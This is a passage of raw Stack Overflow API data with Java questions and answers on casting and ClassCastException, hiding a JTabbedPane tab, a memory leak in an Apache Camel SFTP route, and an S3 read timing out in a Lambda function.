<BR><BR>\nFrom that user is responsible for explicit casting when narrowing down the object relationship to say that user knows and fine with they loose some precision because of this. However still compiler can detect some explicit wrong casting and throw <code>CE: Type mismatch error</code> at some point. Beyond that point it is up to runtime <code>ClassCastException</code> to deal with it.</p>\n\n<blockquote>\n  <p>Compiler can detect the following cases of explicit casting.</p>\n</blockquote>\n\n<pre><code>class A {}\nclass B {}\n\nA a = (A) new B(); //CE: Type mismatch: cannot convert from B to A\nB b = (B) new A(); //compilation error (CE)\n</code></pre>\n\n<hr>\n\n<pre><code>interface I {}\nfinal class A {}\nI i = (I) new A();  //compilation error\n</code></pre>\n\n<hr>\n\n<blockquote>\n  <p>Compiler can not detect the following cases of explicit casting.</p>\n</blockquote>\n\n<pre><code>class A {}\nclass B extends A {}\nA a = (A) new B(); //Fine\nB b = (B) new A(); //Runtime error; because compile time;\n                   //compiler wont be able to tell the reference is instance of A or B.\n                   //means this is something like below. &lt;BR&gt;\nB b = (B) (A) new A();\n</code></pre>\n\n<hr>\n\n<p>Any Object can be caste to any interface without compilation error.</p>\n\n<pre><code>interface I {}\nclass A {}\nclass B extends A implements I{}\n\nI i = (I) new A();  //Runtime error\nI i = (I) new B();  //Fine\n</code></pre>\n\n<hr>\n\n<p><a href=\"https://stackoverflow.com/questions/1495308/why-does-this-compile\">Why does this compile?</a> <BR></p>\n\n<p>Reference of interfaces can castes to any object without compilation error.</p>\n\n<pre><code>interface I {}\nclass A implements I {}\nclass B {}\n\nB b = (B) getI();     //Runtime error\nOR \nB b = (B)(I)new A();  //Runtime error\n\npublic I getI() {\n return new A();\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6440480,"reputation":19239,"user_id":4990642,"accept_rate":53,"display_name":"Soner from The Ottoman Empire"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683723982,"creation_date":1683723982,"answer_id":76218778,"question_id":19895304,"body_markdown":"I think no need too many words. Simply kindly consider the following example by keeping in mind that ***a superior reference can be a pointer to its one of subclasses.***\r\n\r\n    class Test {\r\n       public static void main(String[] args) {\r\n          \r\n         class x {}\r\n         interface z {}\r\n         class y extends x implements z {}\r\n\r\n         x xx = new x();\r\n         // var q = (z)xx; // class cast exception\r\n         xx = (new y()); // xx is kinda superior ref-type of &quot;class y&quot; right? It can point it.\r\n         var qq = (z)xx;\r\n        }\r\n    }\r\n\r\nIf we restrain it, how can the reference refer to the object after the correct casting? (at the last line)","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<p>I think no need too many words. Simply kindly consider the following example by keeping in mind that <em><strong>a superior reference can be a pointer to its one of subclasses.</strong></em></p>\n<pre><code>class Test {\n   public static void main(String[] args) {\n      \n     class x {}\n     interface z {}\n     class y extends x implements z {}\n\n     x xx = new x();\n     // var q = (z)xx; // class cast exception\n     xx = (new y()); // xx is kinda superior ref-type of &quot;class y&quot; right? It can point it.\n     var qq = (z)xx;\n    }\n}\n</code></pre>\n<p>If we restrain it, how can the reference refer to the object after the correct casting? (at the last line)</p>\n"}],"owner":{"account_id":3565431,"reputation":647,"user_id":2977092,"display_name":"luukburger"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":6421,"favorite_count":0,"down_vote_count":0,"up_vote_count":16,"accepted_answer_id":19895533,"answer_count":7,"score":16,"last_activity_date":1683723982,"creation_date":1384118274,"question_id":19895304,"body_markdown":"Studying for my OCA Java SE 7 Programmer I exam, so newbie question. I have an example question I do not understand. The following code compiles, but gives a ClassCastException at runtime:\r\n\r\n    interface Roamable {\r\n    }\r\n    \r\n    class Phone {\r\n    }\r\n    \r\n    public class Tablet extends Phone implements Roamable {\r\n    \tpublic static void main(String... args) {\r\n    \t\tRoamable var = (Roamable) new Phone();\r\n    \t}\r\n    }\r\n\r\nWhen I change `Roamable var = (Roamable) new Phone();` into `Roamable var = (Roamable) new String();` I get a compilation error right away.\r\n\r\nTwo questions:\r\n\r\n1. Why does the code above compile at all? Phone seems unrelated to Roamable to me?\r\n2. Why does the code compile with `new Phone()`, but doesn&#39;t it compile with `new String()`?","title":"ClassCastException vs. &quot;cannot cast&quot; compilation error","body":"<p>Studying for my OCA Java SE 7 Programmer I exam, so newbie question. I have an example question I do not understand. The following code compiles, but gives a ClassCastException at runtime:</p>\n\n<pre><code>interface Roamable {\n}\n\nclass Phone {\n}\n\npublic class Tablet extends Phone implements Roamable {\n    public static void main(String... args) {\n        Roamable var = (Roamable) new Phone();\n    }\n}\n</code></pre>\n\n<p>When I change <code>Roamable var = (Roamable) new Phone();</code> into <code>Roamable var = (Roamable) new String();</code> I get a compilation error right away.</p>\n\n<p>Two questions:</p>\n\n<ol>\n<li>Why does the code above compile at all? Phone seems unrelated to Roamable to me?</li>\n<li>Why does the code compile with <code>new Phone()</code>, but doesn't it compile with <code>new String()</code>?</li>\n</ol>\n"},{"tags":["java","swing"],"comments":[{"owner":{"account_id":247613,"reputation":284089,"user_id":522444,"accept_rate":100,"display_name":"Hovercraft Full Of Eels"},"score":3,"creation_date":1683717210,"post_id":76217689,"comment_id":134408524,"body_markdown":"1. Use a CardLayout, and in the class where you control this layout, not allow it to be shown unless the user has the required credentials. 2. Never, ***NEVER*** use a null layout, as you&#39;re doing.","body":"1. Use a CardLayout, and in the class where you control this layout, not allow it to be shown unless the user has the required credentials. 2. Never, <b><i>NEVER</i></b> use a null layout, as you&#39;re doing."},{"owner":{"account_id":2360785,"reputation":11123,"user_id":2067492,"display_name":"matt"},"score":0,"creation_date":1683717258,"post_id":76217689,"comment_id":134408537,"body_markdown":"What do you mean &quot;hide the RegPanel&quot;? Do you want the tab to go away? Or you want the tab to display an empty panel?","body":"What do you mean &quot;hide the RegPanel&quot;? Do you want the tab to go away? Or you want the tab to display an empty panel?"}],"answers":[{"tags":[],"owner":{"account_id":214928,"reputation":9307,"user_id":469201,"accept_rate":67,"display_name":"davidbuzatto"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683718184,"creation_date":1683717755,"answer_id":76217798,"question_id":76217689,"body_markdown":"You need to remove the tab that you want to &quot;hide&quot; using `removeTabAt` method from `JTabbedPane`. Changing the state of the `JPanel` that is acting as the tab content pane will not work.\r\n\r\n    import java.awt.BorderLayout;\r\n    import java.awt.EventQueue;\r\n    import java.awt.event.ActionEvent;\r\n    import java.awt.event.ActionListener;\r\n    import javax.swing.JButton;\r\n    import javax.swing.JFrame;\r\n    import javax.swing.JOptionPane;\r\n    import javax.swing.JPanel;\r\n    import javax.swing.JTabbedPane;\r\n    \r\n    /**\r\n     *\r\n     * @author Prof. Dr. David Buzatto\r\n     */\r\n    public class MainWindow extends JFrame {\r\n    \r\n        private JTabbedPane tabbedPane;\r\n        private JButton closeTabButton;\r\n        private JButton showTabButton;\r\n        private JPanel buttonContainerPanel;\r\n        private JPanel logPanel;\r\n        private JPanel regPanel;\r\n        \r\n        public MainWindow() {\r\n            \r\n            tabbedPane = new JTabbedPane();\r\n            closeTabButton = new JButton( &quot;Close Register Tab&quot; );\r\n            showTabButton = new JButton( &quot;Show Register Tab&quot; );\r\n            buttonContainerPanel = new JPanel();\r\n            \r\n            logPanel = new JPanel();\r\n            regPanel = new JPanel();\r\n            \r\n            tabbedPane.addTab( &quot;Log in&quot;, logPanel );\r\n            tabbedPane.addTab( &quot;Register Tab&quot;, regPanel );\r\n            \r\n            closeTabButton.addActionListener( new ActionListener() {\r\n                @Override\r\n                public void actionPerformed( ActionEvent e ) {\r\n                    try {\r\n                        tabbedPane.removeTabAt( 1 );\r\n                    } catch ( IndexOutOfBoundsException exc ) {\r\n                        JOptionPane.showMessageDialog( \r\n                                ( (JButton) e.getSource() ).getParent().getParent(), \r\n                                &quot;There ins&#39;t a tab in the index 1.&quot;);\r\n                    }\r\n                }\r\n            });\r\n            \r\n            showTabButton.addActionListener( new ActionListener() {\r\n                @Override\r\n                public void actionPerformed( ActionEvent e ) {\r\n                    tabbedPane.addTab( &quot;Register Tab&quot;, regPanel );\r\n                }\r\n            });\r\n            \r\n            buttonContainerPanel.add( closeTabButton );\r\n            buttonContainerPanel.add( showTabButton );\r\n            \r\n            add( buttonContainerPanel, BorderLayout.NORTH );\r\n            add( tabbedPane, BorderLayout.CENTER );\r\n            \r\n            setDefaultCloseOperation( EXIT_ON_CLOSE );\r\n            setTitle( &quot;JTabbedPane Example&quot; );\r\n            setSize( 600, 600 );\r\n            setLocationRelativeTo( null );\r\n            \r\n        }\r\n        \r\n        public static void main( String[] args ) {\r\n            EventQueue.invokeLater( new Runnable() {\r\n                public void run() {\r\n                    new MainWindow().setVisible( true );\r\n                }\r\n            });\r\n        }\r\n        \r\n    }","title":"How to hide a Panel inside JTabbedPane?","body":"<p>You need to remove the tab that you want to &quot;hide&quot; using <code>removeTabAt</code> method from <code>JTabbedPane</code>. Changing the state of the <code>JPanel</code> that is acting as the tab content pane will not work.</p>\n<pre><code>import java.awt.BorderLayout;\nimport java.awt.EventQueue;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPanel;\nimport javax.swing.JTabbedPane;\n\n/**\n *\n * @author Prof. Dr. David Buzatto\n */\npublic class MainWindow extends JFrame {\n\n    private JTabbedPane tabbedPane;\n    private JButton closeTabButton;\n    private JButton showTabButton;\n    private JPanel buttonContainerPanel;\n    private JPanel logPanel;\n    private JPanel regPanel;\n    \n    public MainWindow() {\n        \n        tabbedPane = new JTabbedPane();\n        closeTabButton = new JButton( &quot;Close Register Tab&quot; );\n        showTabButton = new JButton( &quot;Show Register Tab&quot; );\n        buttonContainerPanel = new JPanel();\n        \n        logPanel = new JPanel();\n        regPanel = new JPanel();\n        \n        tabbedPane.addTab( &quot;Log in&quot;, logPanel );\n        tabbedPane.addTab( &quot;Register Tab&quot;, regPanel );\n        \n        closeTabButton.addActionListener( new ActionListener() {\n            @Override\n            public void actionPerformed( ActionEvent e ) {\n                try {\n                    tabbedPane.removeTabAt( 1 );\n                } catch ( IndexOutOfBoundsException exc ) {\n                    JOptionPane.showMessageDialog( \n                            ( (JButton) e.getSource() ).getParent().getParent(), \n                            &quot;There ins't a tab in the index 1.&quot;);\n                }\n            }\n        });\n        \n        showTabButton.addActionListener( new ActionListener() {\n            @Override\n            public void actionPerformed( ActionEvent e ) {\n                tabbedPane.addTab( &quot;Register Tab&quot;, regPanel );\n            }\n        });\n        \n        buttonContainerPanel.add( closeTabButton );\n        buttonContainerPanel.add( showTabButton );\n        \n        add( buttonContainerPanel, BorderLayout.NORTH );\n        add( tabbedPane, BorderLayout.CENTER );\n        \n        setDefaultCloseOperation( EXIT_ON_CLOSE );\n        setTitle( &quot;JTabbedPane Example&quot; );\n        setSize( 600, 600 );\n        setLocationRelativeTo( null );\n        \n    }\n    \n    public static void main( String[] args ) {\n        EventQueue.invokeLater( new Runnable() {\n            public void run() {\n                new MainWindow().setVisible( true );\n            }\n        });\n    }\n    \n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2360785,"reputation":11123,"user_id":2067492,"display_name":"matt"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683723886,"creation_date":1683723886,"answer_id":76218769,"question_id":76217689,"body_markdown":"You can use setVisible, but not on the panel you you add to the tabbed pane. The tabbed pane actually uses setVisible on the components added to it. So if you say &quot;setVisible(false);&quot; when you click on the tab the component will be shown.\r\n\r\nThe example below shows this behavior. When you select the tab, the visibility of JPanel a gets set. The visibility of `toggle` doesn&#39;t get set because it is a child of `a`.\r\n\r\nThat way calling `toggle.setVisible(false);` it will be hidden when the tab is selected.\r\n\r\nFor your example, \r\n\r\n    JPanel wrapper = new JPanel();\r\n    wrapper.add(regPanel);\r\n    tabbedPane.addTab(&quot;Register Tab&quot;, null, wrapper, null);\r\n    \r\nThat way you can call `setVisible` on the `regPanel` and it will stay hidden when the tab is selected.\r\n\r\n```\r\nimport javax.swing.*;\r\n\r\npublic class TabMeNot{\r\n\r\n    public static void main(String[] args){\r\n\t\tJPanel a = new JPanel(){\r\n\t\t    @Override\r\n\t\t    public void setVisible(boolean t){\r\n\t\t        super.setVisible(t);\r\n\t\t        System.out.println(&quot;set visibility&quot;);\r\n\t\t    }\r\n\t\t};\r\n\t\t//a.add(new JLabel(&quot;A panel&quot;));\r\n\t\tJPanel toggle = new JPanel();\r\n\t\ttoggle.add(new JLabel(&quot;A panel&quot;));\r\n\t\ta.add(toggle);\r\n\t\tJPanel b = new JPanel();\r\n\t\tb.add(new JLabel(&quot;B panel&quot;));\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\tJTabbedPane tabs = new JTabbedPane();\r\n\t\ttabs.add(&quot;A&quot;, a);\r\n\t\ttabs.add(&quot;B&quot;, b);\r\n\t\tJFrame frame= new JFrame(&quot;tab me, tab me not&quot;);\r\n\t\tframe.setContentPane(tabs);\r\n\t\tframe.pack();\r\n\t\tframe.setVisible(true);\r\n\t\tTimer t = new Timer(2500, evt -&gt;{\r\n\t\t\ttoggle.setVisible(!toggle.isVisible());\r\n\t\t});\r\n\t\tt.start();\r\n    }\r\n\r\n}\r\n```","title":"How to hide a Panel inside JTabbedPane?","body":"<p>You can use setVisible, but not on the panel you you add to the tabbed pane. The tabbed pane actually uses setVisible on the components added to it. So if you say &quot;setVisible(false);&quot; when you click on the tab the component will be shown.</p>\n<p>The example below shows this behavior. When you select the tab, the visibility of JPanel a gets set. The visibility of <code>toggle</code> doesn't get set because it is a child of <code>a</code>.</p>\n<p>That way calling <code>toggle.setVisible(false);</code> it will be hidden when the tab is selected.</p>\n<p>For your example,</p>\n<pre><code>JPanel wrapper = new JPanel();\nwrapper.add(regPanel);\ntabbedPane.addTab(&quot;Register Tab&quot;, null, wrapper, null);\n</code></pre>\n<p>That way you can call <code>setVisible</code> on the <code>regPanel</code> and it will stay hidden when the tab is selected.</p>\n<pre><code>import javax.swing.*;\n\npublic class TabMeNot{\n\n    public static void main(String[] args){\n        JPanel a = new JPanel(){\n            @Override\n            public void setVisible(boolean t){\n                super.setVisible(t);\n                System.out.println(&quot;set visibility&quot;);\n            }\n        };\n        //a.add(new JLabel(&quot;A panel&quot;));\n        JPanel toggle = new JPanel();\n        toggle.add(new JLabel(&quot;A panel&quot;));\n        a.add(toggle);\n        JPanel b = new JPanel();\n        b.add(new JLabel(&quot;B panel&quot;));\n        \n        \n        \n        JTabbedPane tabs = new JTabbedPane();\n        tabs.add(&quot;A&quot;, a);\n        tabs.add(&quot;B&quot;, b);\n        JFrame frame= new JFrame(&quot;tab me, tab me not&quot;);\n        frame.setContentPane(tabs);\n        frame.pack();\n        frame.setVisible(true);\n        Timer t = new Timer(2500, evt -&gt;{\n            toggle.setVisible(!toggle.isVisible());\n        });\n        t.start();\n    }\n\n}\n</code></pre>\n"}],"owner":{"account_id":28086156,"reputation":11,"user_id":21456496,"display_name":"Fernand Emil Saul"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":57,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":2,"score":0,"last_activity_date":1683723886,"creation_date":1683717048,"question_id":76217689,"body_markdown":"I want to hide a JPanel inside a JTabbedPane.\r\n\r\nHow do I hide the RegPanel? Only to be visible after logging in LogPanel.\r\n\r\n\t\t\r\n```java\r\nJPanel LogPanel = new JPanel();\r\ntabbedPane.addTab(&quot;Log in&quot;, null, LogPanel, null);\r\nLogPanel.setLayout(null);\r\n\r\nJPanel RegPanel = new JPanel();\r\ntabbedPane.addTab(&quot;Register Tab&quot;, null, RegPanel, null);\r\nRegPanel.setLayout(null);\r\n```\r\n\r\n![[enter image description here](https://i.stack.imgur.com/pBkeZ.png)](https://i.stack.imgur.com/hu18T.png)\r\n\r\nI tried using setVisible, but it does not seem to work.","title":"How to hide a Panel inside JTabbedPane?","body":"<p>I want to hide a JPanel inside a JTabbedPane.</p>\n<p>How do I hide the RegPanel? Only to be visible after logging in LogPanel.</p>\n<pre class=\"lang-java prettyprint-override\"><code>JPanel LogPanel = new JPanel();\ntabbedPane.addTab(&quot;Log in&quot;, null, LogPanel, null);\nLogPanel.setLayout(null);\n\nJPanel RegPanel = new JPanel();\ntabbedPane.addTab(&quot;Register Tab&quot;, null, RegPanel, null);\nRegPanel.setLayout(null);\n</code></pre>\n<p><img src=\"https://i.stack.imgur.com/hu18T.png\" alt=\"enter image description here\" /></p>\n<p>I tried using setVisible, but it does not seem to work.</p>\n"},{"tags":["java","memory","apache-camel","jsch"],"comments":[{"owner":{"account_id":39208,"reputation":251240,"user_id":112968,"accept_rate":68,"display_name":"knittl"},"score":2,"creation_date":1679044430,"post_id":75765673,"comment_id":133653823,"body_markdown":"This sounds like a memory leak and not something that is solved by using a different data structure. First find out _where_ all that memory is used. A FIFO can be easily implemented using `Queue` or `Deque` interfaces (with several implementations already provided by the JDK)","body":"This sounds like a memory leak and not something that is solved by using a different data structure. First find out <i>where</i> all that memory is used. A FIFO can be easily implemented using <code>Queue</code> or <code>Deque</code> interfaces (with several implementations already provided by the JDK)"},{"owner":{"account_id":213468,"reputation":103488,"user_id":466862,"display_name":"Mark Rotteveel"},"score":1,"creation_date":1679051972,"post_id":75765673,"comment_id":133655699,"body_markdown":"`java.util.ArrayList` is about as memory efficient as possible. A linked list is definitely less memory-efficient. However, if you need to do FIFO processing, an `ArrayDeque` or an `ArrayBlockingQueue` might be better suited.","body":"<code>java.util.ArrayList</code> is about as memory efficient as possible. A linked list is definitely less memory-efficient. However, if you need to do FIFO processing, an <code>ArrayDeque</code> or an <code>ArrayBlockingQueue</code> might be better suited."},{"owner":{"account_id":9013088,"reputation":11,"user_id":6716923,"display_name":"B.War"},"score":0,"creation_date":1682262031,"post_id":75765673,"comment_id":134183983,"body_markdown":"Thanks @knittl we know it is a memory issue, but cannot find out exactly where the issue is. one observation is, after the file has been processed say at 9:00 the memory comes down to its previous state before file processing begins but weirdly the memory then onwards gradually increases. we are not sure whats happening and how to find them. All looks good in tools like visualVM","body":"Thanks @knittl we know it is a memory issue, but cannot find out exactly where the issue is. one observation is, after the file has been processed say at 9:00 the memory comes down to its previous state before file processing begins but weirdly the memory then onwards gradually increases. we are not sure whats happening and how to find them. All looks good in tools like visualVM"},{"owner":{"account_id":9013088,"reputation":11,"user_id":6716923,"display_name":"B.War"},"score":0,"creation_date":1682262169,"post_id":75765673,"comment_id":134183999,"body_markdown":"@MarkRotteveel how efficient is ArrayDeque compared with ArrayList. right now I have used trimToSize for arrayList and clearing the data(changing to null) after 500 objects are processed. Do you think this would solve the issue in long run?","body":"@MarkRotteveel how efficient is ArrayDeque compared with ArrayList. right now I have used trimToSize for arrayList and clearing the data(changing to null) after 500 objects are processed. Do you think this would solve the issue in long run?"},{"owner":{"account_id":39208,"reputation":251240,"user_id":112968,"accept_rate":68,"display_name":"knittl"},"score":0,"creation_date":1682263276,"post_id":75765673,"comment_id":134184158,"body_markdown":"An ArrayDeque does not shrink again, as compared to e.g. a `LinkedList` (which has higher overhead for each node in the list). It is almost impossible to say where your leake is without seeing a [mre]. My suggestion: take a heap dump, then inspect your objects in the dump.","body":"An ArrayDeque does not shrink again, as compared to e.g. a <code>LinkedList</code> (which has higher overhead for each node in the list). It is almost impossible to say where your leake is without seeing a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. My suggestion: take a heap dump, then inspect your objects in the dump."},{"owner":{"account_id":213468,"reputation":103488,"user_id":466862,"display_name":"Mark Rotteveel"},"score":0,"creation_date":1682264067,"post_id":75765673,"comment_id":134184274,"body_markdown":"You can&#39;t trim an `ArrayDeque`, but if that is really your concern, then use an `ArrayBlockingQueue` so you have a maximum size. That way the producer is blocked if the consumers cannot keep up and the queue is full.","body":"You can&#39;t trim an <code>ArrayDeque</code>, but if that is really your concern, then use an <code>ArrayBlockingQueue</code> so you have a maximum size. That way the producer is blocked if the consumers cannot keep up and the queue is full."},{"owner":{"account_id":9013088,"reputation":11,"user_id":6716923,"display_name":"B.War"},"score":0,"creation_date":1682271010,"post_id":75765673,"comment_id":134185248,"body_markdown":"I will try taking heap dump and also see how well we can change to ArrayBlockingQueue as @MarkRotteveel suggested","body":"I will try taking heap dump and also see how well we can change to ArrayBlockingQueue as @MarkRotteveel suggested"}],"answers":[{"tags":[],"owner":{"account_id":9013088,"reputation":11,"user_id":6716923,"display_name":"B.War"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683723694,"creation_date":1683723694,"answer_id":76218742,"question_id":75765673,"body_markdown":"As @knittl suggested I took a heapdump and looks like Apache camel is causing this memory issue. We are pulling files from SFTP daily and decrypt them before going through data processing and inserting into DB. It looks like Apache camel is not freeing up the memory from its jsch buffer. Can someone suggest what we can do here?\r\n\r\nOur camel is simple, sharing a sample here from(&quot;sftpUrl&quot;+dynamic_fileName+&quot;.pgp&quot;).routeId(&quot;id&quot;).process(isDuplicateFile).unmarshal().pgp(somekey,user,pwd).unmarshal().string().process(writeToDBProcessor).log(&quot;Done&quot;);","title":"Memory Efficient Abstract Linear data type to store and iterate 1 million to 2 million records in java - Apache camel","body":"<p>As @knittl suggested I took a heapdump and looks like Apache camel is causing this memory issue. We are pulling files from SFTP daily and decrypt them before going through data processing and inserting into DB. It looks like Apache camel is not freeing up the memory from its jsch buffer. Can someone suggest what we can do here?</p>\n<p>Our camel is simple, sharing a sample here from(&quot;sftpUrl&quot;+dynamic_fileName+&quot;.pgp&quot;).routeId(&quot;id&quot;).process(isDuplicateFile).unmarshal().pgp(somekey,user,pwd).unmarshal().string().process(writeToDBProcessor).log(&quot;Done&quot;);</p>\n"}],"owner":{"account_id":9013088,"reputation":11,"user_id":6716923,"display_name":"B.War"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":62,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683723872,"creation_date":1679044230,"question_id":75765673,"body_markdown":"This is a curiosity question, recently we faced out of memory issue with one of our microservices. This memory issue happens once in a month so basically application is running for 1 month without any issue but after that it is throwing out of memory. Our guess memory is increasing after running through daily files and storing them into DB which not getting cleared by GC somehow. \r\n\r\nWe tried to refactor the code wherein I suggested to use custom array list (standard size) or singly linked list to store them. This made me wonder whether we have any memory efficient dynamic list to store large volume of custom objects.\r\n\r\nNote: the list just need to store the record and access them in FIFO order, once recorded into DB it will be cleared\r\n\r\nNote 2: please share if you know any memory efficient ADT already available in Apache commons collection or anything as such.","title":"Memory Efficient Abstract Linear data type to store and iterate 1 million to 2 million records in java - Apache camel","body":"<p>This is a curiosity question, recently we faced out of memory issue with one of our microservices. This memory issue happens once in a month so basically application is running for 1 month without any issue but after that it is throwing out of memory. Our guess memory is increasing after running through daily files and storing them into DB which not getting cleared by GC somehow.</p>\n<p>We tried to refactor the code wherein I suggested to use custom array list (standard size) or singly linked list to store them. This made me wonder whether we have any memory efficient dynamic list to store large volume of custom objects.</p>\n<p>Note: the list just need to store the record and access them in FIFO order, once recorded into DB it will be cleared</p>\n<p>Note 2: please share if you know any memory efficient ADT already available in Apache commons collection or anything as such.</p>\n"},{"tags":["java","amazon-web-services","amazon-s3","aws-sdk"],"comments":[{"owner":{"account_id":100740,"reputation":73217,"user_id":271415,"accept_rate":91,"display_name":"jarmod"},"score":0,"creation_date":1683715930,"post_id":76217503,"comment_id":134408255,"body_markdown":"What do CloudWatch Logs tell you? Perhaps this is as simple as the object being large so takes a long time to download and the Lambda function timeout is too low.","body":"What do CloudWatch Logs tell you? Perhaps this is as simple as the object being large so takes a long time to download and the Lambda function timeout is too low."},{"owner":{"account_id":14232409,"reputation":270,"user_id":10281244,"display_name":"Diksha Goyal"},"score":0,"creation_date":1683716637,"post_id":76217503,"comment_id":134408403,"body_markdown":"Yeah so, the object size is `20B` and the API Gateway timeout is 29 seconds. Also, I am not getting any logs after getObject()","body":"Yeah so, the object size is <code>20B</code> and the API Gateway timeout is 29 seconds. Also, I am not getting any logs after getObject()"},{"owner":{"account_id":100740,"reputation":73217,"user_id":271415,"accept_rate":91,"display_name":"jarmod"},"score":0,"creation_date":1683716828,"post_id":76217503,"comment_id":134408449,"body_markdown":"There are final CloudWatch Logs beginning with &quot;END&quot; and &quot;REPORT&quot;. Please include (ideally all of) the CW logs in your post but remove any sensitive info. What does your code do after the call to getObject? You should ideally include all the relevant code, not just the fragment shown.","body":"There are final CloudWatch Logs beginning with &quot;END&quot; and &quot;REPORT&quot;. Please include (ideally all of) the CW logs in your post but remove any sensitive info. What does your code do after the call to getObject? You should ideally include all the relevant code, not just the fragment shown."},{"owner":{"account_id":100740,"reputation":73217,"user_id":271415,"accept_rate":91,"display_name":"jarmod"},"score":0,"creation_date":1683717245,"post_id":76217503,"comment_id":134408534,"body_markdown":"The first thing to determine is if the Lambda function invocation timed out. You will see this in the CW logs. That&#39;s commonly caused by a networking misconfiguration where the Lambda function cannot reach an external endpoint, in this case the S3 service endpoint. The typical cause is connecting the Lambda function to a VPC but mis-configuring things.","body":"The first thing to determine is if the Lambda function invocation timed out. You will see this in the CW logs. That&#39;s commonly caused by a networking misconfiguration where the Lambda function cannot reach an external endpoint, in this case the S3 service endpoint. The typical cause is connecting the Lambda function to a VPC but mis-configuring things."},{"owner":{"account_id":8704066,"reputation":812,"user_id":6512807,"display_name":"Vikram S"},"score":0,"creation_date":1683718696,"post_id":76217503,"comment_id":134408877,"body_markdown":"Also it will be easy to debug if you can add the complete Lambda Code to understand what you trying to do.","body":"Also it will be easy to debug if you can add the complete Lambda Code to understand what you trying to do."}],"answers":[{"tags":[],"owner":{"account_id":1540816,"reputation":10259,"user_id":1435543,"display_name":"smac2020"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683723452,"creation_date":1683723452,"answer_id":76218703,"question_id":76217503,"body_markdown":"Your code is not best practice. You are using Java V1 - not the recommended V2 version. You can read S3 objects from a Lambda function that is invoked by API Gateway. There is a full serverless tutorial that shows this use case in the [AWS Code Library][1]. It uses AWS SDK for Java V2. \r\n\r\nLook at that code:\r\n\r\n[Create a photo asset management application that lets users manage photos using labels][2]\r\n\r\nAlso - when running AWS Java code in a Lambda function, you do not need to specify credentials to use AWS Services. Instead - you run the Lambda function using a role that has permission to invoke the specific AWS Service. \r\n\r\nHere is part of the code that reads an object in a S3 bucket and returns a byte[].\r\n\r\n    public class S3Service {\r\n        // Create the S3Client object.\r\n        private S3Client getClient() {\r\n            return S3Client.builder()\r\n                .region(PhotoApplicationResources.REGION)\r\n                .build();\r\n        }\r\n    \r\n        public byte[] getObjectBytes(String bucketName, String keyName) {\r\n            S3Client s3 = getClient();\r\n            try {\r\n                GetObjectRequest objectRequest = GetObjectRequest\r\n                    .builder()\r\n                    .key(keyName)\r\n                    .bucket(bucketName)\r\n                    .build();\r\n    \r\n                ResponseBytes&lt;GetObjectResponse&gt; objectBytes = s3.getObjectAsBytes(objectRequest);\r\n                return objectBytes.asByteArray();\r\n            } catch (S3Exception e) {\r\n                System.err.println(e.awsErrorDetails().errorMessage());\r\n                e.printStackTrace();\r\n                throw e;\r\n            }\r\n        }\r\n\r\n  [1]: https://docs.aws.amazon.com/code-library/latest/ug/what-is-code-library.html\r\n  [2]: https://%20https://docs.aws.amazon.com/code-library/latest/ug/s3_example_cross_PAM_section.html\r\n","title":"S3 get object not responding","body":"<p>Your code is not best practice. You are using Java V1 - not the recommended V2 version. You can read S3 objects from a Lambda function that is invoked by API Gateway. There is a full serverless tutorial that shows this use case in the <a href=\"https://docs.aws.amazon.com/code-library/latest/ug/what-is-code-library.html\" rel=\"nofollow noreferrer\">AWS Code Library</a>. It uses AWS SDK for Java V2.</p>\n<p>Look at that code:</p>\n<p><a href=\"https://%20https://docs.aws.amazon.com/code-library/latest/ug/s3_example_cross_PAM_section.html\" rel=\"nofollow noreferrer\">Create a photo asset management application that lets users manage photos using labels</a></p>\n<p>Also - when running AWS Java code in a Lambda function, you do not need to specify credentials to use AWS Services. Instead - you run the Lambda function using a role that has permission to invoke the specific AWS Service.</p>\n<p>Here is part of the code that reads an object in a S3 bucket and returns a byte[].</p>\n<pre><code>public class S3Service {\n    // Create the S3Client object.\n    private S3Client getClient() {\n        return S3Client.builder()\n            .region(PhotoApplicationResources.REGION)\n            .build();\n    }\n\n    public byte[] getObjectBytes(String bucketName, String keyName) {\n        S3Client s3 = getClient();\n        try {\n            GetObjectRequest objectRequest = GetObjectRequest\n                .builder()\n                .key(keyName)\n                .bucket(bucketName)\n                .build();\n\n            ResponseBytes&lt;GetObjectResponse&gt; objectBytes = s3.getObjectAsBytes(objectRequest);\n            return objectBytes.asByteArray();\n        } catch (S3Exception e) {\n            System.err.println(e.awsErrorDetails().errorMessage());\n            e.printStackTrace();\n            throw e;\n        }\n    }\n</code></pre>\n"}],"owner":{"account_id":14232409,"reputation":270,"user_id":10281244,"display_name":"Diksha Goyal"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":468,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683723452,"creation_date":1683715734,"question_id":76217503,"body_markdown":"I have a lambda function in place which is connected to API Gateway. The lambda function fetches a file from S3. But Somehow, I am not getting any response from S3 &amp; the API Gateway request is timing out. Can you please help me understand the issue here?\r\n\r\n&gt; The file I am trying to read is just of 20B in size\r\n\r\nCode:-\r\n```\r\n\r\n ClientConfiguration clientConfiguration = new ClientConfiguration();\r\n clientConfiguration.setMaxErrorRetry(5);\r\n 